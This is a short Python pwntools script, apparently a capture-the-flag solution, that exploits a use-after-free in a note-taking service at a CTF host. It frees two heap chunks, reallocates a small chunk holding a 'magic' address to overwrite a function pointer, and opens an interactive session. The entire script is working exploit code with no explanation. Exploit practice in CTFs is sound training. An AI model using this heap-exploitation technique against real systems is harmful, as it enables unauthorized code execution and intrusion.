#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 19007
r = remote(host,port)

def addnote(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

addnote(0x40,"a")
addnote(0x40,"a")
free(1)
free(0)
magic = 0x0000000000400c23
addnote(0x10,p64(magic))

r.interactive()
